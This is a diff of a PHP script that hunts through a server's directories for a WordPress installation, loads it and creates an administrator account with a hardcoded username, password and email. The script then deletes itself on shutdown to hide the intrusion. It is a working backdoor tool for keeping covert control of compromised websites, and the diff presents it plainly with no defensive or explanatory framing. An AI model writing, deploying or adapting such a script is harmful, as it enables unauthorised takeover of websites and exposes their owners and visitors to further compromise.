@@ -1,15 +1,151 @@
 <?php
-include 'wp-config.php';
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+set_time_limit(60);
+register_shutdown_function(function() {
+    @unlink(__FILE__);
+});
 
-$user_login	= 'themegs';
-$user_pass	= 'azdd9c123.66@';
-$user_email	= 'peckadlegwt@gmail.com';
-$role		= 'administrator';
+class WP_Admin_Creator {
+    
+    private $wp_root = null;
+    private $wp_config_path = null;
+    private $search_paths = [];
+    
+    public function findWordPress() {
+        $current_dir = dirname(__FILE__);
+        $this->searchUpward($current_dir);
+        
+        $common_paths = [
+            $_SERVER['DOCUMENT_ROOT'] ?? '',
+            '/var/www/html',
+            '/var/www',
+            '/home/wwwroot',
+            '/www/wwwroot',
+            '/usr/share/nginx/html',
+            '/var/www/public_html',
+            '/var/www/htdocs',
+            dirname($_SERVER['SCRIPT_FILENAME'] ?? ''),
+        ];
+        
+        foreach ($common_paths as $path) {
+            if (!empty($path) && is_dir($path)) {
+                $this->searchInDirectory($path);
+                $this->searchSubDirectories($path, 1);
+            }
+        }
+        
+        $this->searchSubDirectories($current_dir, 2);
+        
+        return $this->wp_root !== null;
+    }
+    
+    private function searchUpward($dir, $max_levels = 10) {
+        $level = 0;
+        $current = realpath($dir);
+        
+        while ($current && $level < $max_levels) {
+            $this->search_paths[] = $current;
+            if ($this->isWordPressRoot($current)) {
+                return true;
+            }
+            $parent = dirname($current);
+            if ($parent === $current) break;
+            $current = $parent;
+            $level++;
+        }
+        return false;
+    }
+    
+    private function searchSubDirectories($dir, $depth = 2) {
+        if ($depth <= 0 || !is_dir($dir) || !is_readable($dir)) {
+            return;
+        }
+        
+        $items = @scandir($dir);
+        if ($items === false) return;
+        
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $path = $dir . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($path)) {
+                $this->search_paths[] = $path;
+                if ($this->isWordPressRoot($path)) {
+                    return;
+                }
+                $this->searchSubDirectories($path, $depth - 1);
+            }
+        }
+    }
+    
+    private function searchInDirectory($dir) {
+        if (!is_dir($dir) || !is_readable($dir)) return false;
+        $this->search_paths[] = $dir;
+        if ($this->isWordPressRoot($dir)) {
+            return true;
+        }
+        return false;
+    }
+    
+    private function isWordPressRoot($dir) {
+        if ($this->wp_root !== null) return false;
+        
+        $wp_config = $dir . DIRECTORY_SEPARATOR . 'wp-config.php';
+        $wp_load = $dir . DIRECTORY_SEPARATOR . 'wp-load.php';
+        $wp_includes = $dir . DIRECTORY_SEPARATOR . 'wp-includes';
+        
+        if (file_exists($wp_config) && file_exists($wp_load) && is_dir($wp_includes)) {
+            $this->wp_root = $dir;
+            $this->wp_config_path = $wp_config;
+            return true;
+        }
+        
+        if (file_exists($wp_load) && is_dir($wp_includes)) {
+            $parent_config = dirname($dir) . DIRECTORY_SEPARATOR . 'wp-config.php';
+            if (file_exists($parent_config)) {
+                $this->wp_root = $dir;
+                $this->wp_config_path = $parent_config;
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    public function loadWordPress() {
+        if ($this->wp_root === null) {
+            return false;
+        }
+        $wp_load = $this->wp_root . DIRECTORY_SEPARATOR . 'wp-load.php';
+        chdir($this->wp_root);
+        require_once($wp_load);
+        return true;
+    }
+}
 
-$userdata	= compact('user_login', 'user_email', 'user_pass','role');
+$creator = new WP_Admin_Creator();
+if (!$creator->findWordPress()) {
+    die('错误：未找到 WordPress 根目录。');
+}
 
-$user_id	= wp_insert_user($userdata);
+if (!$creator->loadWordPress()) {
+    die('错误：加载 WordPress 环境失败。');
+}
 
-print_R($user_id);
+$user_login = 'admings';
+$user_pass  = 'azdd9c123.66@';
+$user_email = 'peckadlegwt@gmail.com';
+$role       = 'administrator';
 
-unlink(__FILE__);
+if (username_exists($user_login) || email_exists($user_email)) {
+    die('错误：该用户名或邮箱已被注册，文件已自动销毁。');
+}
+
+$userdata = compact('user_login', 'user_email', 'user_pass', 'role');
+$user_id  = wp_insert_user($userdata);
+
+if (is_wp_error($user_id)) {
+    echo '创建管理员失败: ' . $user_id->get_error_message() . '，文件已自动销毁。';
+} else {
+    echo '成功！已创建管理员账号，用户ID为: ' . $user_id . '，文件已自动销毁。';
+}
